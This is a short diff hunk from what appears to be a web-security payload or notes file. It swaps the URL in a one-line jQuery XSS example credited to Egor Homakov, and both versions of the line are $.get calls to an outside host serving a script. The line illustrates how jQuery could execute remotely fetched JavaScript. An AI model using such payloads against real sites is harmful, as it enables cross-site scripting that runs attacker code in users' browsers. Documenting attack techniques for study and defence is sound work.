@@ -37,7 +37,7 @@ Note: This kind of depends on what security level the application is set to. See
  by [Egor Homakov](https://github.com/jquery/jquery/issues/2432)
 
 ```js
-$.get('https://edwinfoudil.com/poc/jqueryxss.js')
+$.get('http://sakurity.com/jqueryxss')
 ```
 
 ## SQLI
